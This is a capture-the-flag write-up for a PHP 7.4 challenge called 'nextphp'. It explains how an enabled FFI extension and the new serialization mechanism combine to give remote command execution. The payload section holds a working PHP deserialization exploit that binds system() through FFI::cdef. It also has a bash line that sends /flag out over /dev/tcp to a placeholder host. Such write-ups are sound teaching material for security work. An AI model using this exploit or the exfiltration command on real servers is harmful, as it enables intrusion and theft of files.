# nextphp

PHP is the best language!

## Writeup

After ``phpinfo();``, you can easily notice the PHP version contains ``-dev``, and you will find a strange extension ``ffi`` is enabled. It's a new feature in PHP 7.4.

Just read these 3 RFCs for PHP 7.4 and write your own payload:

- [PHP RFC: Preloading](https://wiki.php.net/rfc/preload)
- [PHP RFC: FFI - Foreign Function Interface](https://wiki.php.net/rfc/ffi)
- [PHP RFC: New custom object serialization mechanism](https://wiki.php.net/rfc/custom_object_serialization)

> In principle, this makes existing strings serialized in O format fully interoperable with the new serialization mechanism, the data is just provided in a different way (for __wakeup() in properties, for __unserialize() as an explicit array). If a class has both __sleep() and __serialize(), then the latter will be preferred. If a class has both __wakeup() and __unserialize() then the latter will be preferred.

> If a class both implements Serializable and __serialize()/__unserialize(), then serialization will prefer the new mechanism, while unserialization can make use of either, depending on whether the C (Serializable) or O (__unserialize) format is used. As such, old serialized strings encoded in C format can still be decoded, while new strings will be produced in O format.

## Payload

```php
class D implements Serializable {
    protected $data = [
        'ret' => null,
        'func' => 'FFI::cdef',
        'arg' => 'int system(const char *command);'
    ];

    public function serialize (): string {
        return serialize($this->data);
    }

    public function unserialize($payload) {
        $this->data = unserialize($payload);
    }
}

$a = new D();
$b = serialize($a);
$b = str_replace('"D"', '"A"', $b);
$d = unserialize($b);
$d->ret->system('bash -c "cat /flag > /dev/tcp/xxx/xxx"');
```
